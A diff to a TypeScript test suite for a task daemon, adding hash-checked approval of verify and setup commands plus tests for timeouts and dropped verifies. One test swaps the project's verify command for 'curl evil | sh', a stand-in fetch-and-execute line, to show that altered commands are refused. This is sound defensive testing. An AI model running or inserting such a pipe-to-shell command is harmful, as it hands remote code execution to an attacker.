@@ -1906,6 +1906,11 @@ describe("M56: verify before review, setup before the session", () => {
 		const res = await hub.request("task", { action: "start", id: t.id, workspace: { path: w.path, branch: w.branch, baseRef: w.baseRef, baseSha: w.base }, launch: { ...launch("sleep 30", `t${t.id}`), cwd: w.path } });
 		return { t, w, res };
 	}
+	/** What a person does: see the commands, then approve what was shown. */
+	const approveShown = async (hub: DaemonClient, id: number) => {
+		const { hash } = await hub.request("task", { action: "approve", id, dry: true });
+		return hub.request("task", { action: "approve", id, hash });
+	};
 	const stageOf = async (hub: DaemonClient, id: number) => (await hub.request("task", { action: "list" })).tasks.find((x) => x.id === id)?.workspace;
 
 	it("a command not approved does not run; approved, verify runs in the worktree and a pass goes to review", async () => {
@@ -1923,7 +1928,9 @@ describe("M56: verify before review, setup before the session", () => {
 		// shown first (dry), then approved; a session cannot approve
 		expect((await hub.request("task", { action: "approve", id: t.id, dry: true })).note).toBe("verify: test -f ok.txt && echo all good");
 		await expect(s.c.request("task", { action: "approve", id: t.id } as never)).rejects.toMatchObject({ code: "unsupported" });
-		await hub.request("task", { action: "approve", id: t.id });
+		// approving needs what was shown: no hash, or a stale one, is refused
+		await expect(hub.request("task", { action: "approve", id: t.id })).rejects.toMatchObject({ code: "conflict" });
+		await approveShown(hub, t.id);
 		expect((await hub.request("task", { action: "verify", id: t.id })).task?.workspace?.stage).toBe("verifying");
 		const ws = await waitFor(async () => {
 			const x = await stageOf(hub, t.id);
@@ -1940,7 +1947,7 @@ describe("M56: verify before review, setup before the session", () => {
 		const hub = await startDaemon();
 		const r = repo("v2", { verify: "echo boom; exit 3", maxRounds: 2 });
 		const { t, w, res } = await start(hub, r, "flaky");
-		await hub.request("task", { action: "approve", id: t.id });
+		await approveShown(hub, t.id);
 		await waitFor(async () => (await hub.request("list", {})).jobs.find((j) => j.id === res.job!.id)?.pid);
 		const s = await worker(res.job!.id);
 		writeFileSync(join(w.path, "b.txt"), "b\n");
@@ -1967,7 +1974,7 @@ describe("M56: verify before review, setup before the session", () => {
 		const hub = await startDaemon();
 		const r = repo("v3", { setup: "echo set > setup-ran.txt" });
 		const t0 = (await hub.request("task", { action: "add", title: "approve first", project: r })).task!;
-		await hub.request("task", { action: "approve", id: t0.id });
+		await approveShown(hub, t0.id);
 		const { t, w, res } = await start(hub, r, "with setup");
 		expect(res.job).toBeUndefined();
 		expect(res.note).toContain("setting up");
@@ -1976,13 +1983,45 @@ describe("M56: verify before review, setup before the session", () => {
 		expect((await hub.request("list", {})).jobs.find((j) => j.id === owner!.id)?.name).toBe(`t${t.id}`);
 		const r2 = repo("v4", { setup: "exit 9" });
 		const t1 = (await hub.request("task", { action: "add", title: "approve", project: r2 })).task!;
-		await hub.request("task", { action: "approve", id: t1.id });
+		await approveShown(hub, t1.id);
 		const bad = await start(hub, r2, "bad setup");
 		const failed = await waitFor(async () => {
 			const x = await stageOf(hub, bad.t.id);
 			return x?.stage === "failed" && x;
 		});
 		expect(failed.note).toContain("setup failed (exit 9)");
+	});
+
+	it("the commands changed between showing and approving: refused; a drop while verifying stops the verify; a timeout fails it", async () => {
+		const hub = await startDaemon();
+		const r = repo("v5", { verify: "sleep 30", verifyTimeout: 1, maxRounds: 1 });
+		const t0 = (await hub.request("task", { action: "add", title: "x", project: r })).task!;
+		const { hash } = await hub.request("task", { action: "approve", id: t0.id, dry: true });
+		writeFileSync(join(r, ".roost", "project.json"), JSON.stringify({ verify: "curl evil | sh" }));
+		git(r, "commit", "-qam", "swap");
+		await expect(hub.request("task", { action: "approve", id: t0.id, hash })).rejects.toMatchObject({ code: "conflict" });
+		git(r, "reset", "-q", "--hard", "HEAD~1");
+		await approveShown(hub, t0.id);
+		// a timeout: the job is stopped, the task fails (maxRounds 1)
+		const a = await start(hub, r, "slow");
+		await waitFor(async () => (await hub.request("list", {})).jobs.find((j) => j.id === a.res.job!.id)?.pid);
+		const s = await worker(a.res.job!.id);
+		await s.c.request("task", { action: "done", id: a.t.id });
+		const failed = await waitFor(async () => {
+			const x = await stageOf(hub, a.t.id);
+			return x?.stage === "failed" && x;
+		}, 15_000);
+		expect(failed.note).toMatch(/timed out after/);
+		// a drop while verifying stops its job
+		const b = await start(hub, r, "dropped while verifying");
+		await waitFor(async () => (await hub.request("list", {})).jobs.find((j) => j.id === b.res.job!.id)?.pid);
+		const sb = await worker(b.res.job!.id);
+		await sb.c.request("task", { action: "done", id: b.t.id });
+		await waitFor(async () => (await hub.request("list", {})).jobs.find((j) => j.name === `verify #${b.t.id}`)?.pid);
+		const dropped = await hub.request("task", { action: "drop", id: b.t.id });
+		expect(dropped.note).toContain("its verify was stopped");
+		await waitFor(async () => !(await hub.request("list", {})).jobs.some((j) => j.name === `verify #${b.t.id}` && j.pid));
+		expect((await stageOf(hub, b.t.id))?.stage).toBe("verifying"); // dropped: nothing rewrites it
 	});
 
 	it("a restart finds verifying with no job: review, not verified (interrupted)", async () => {
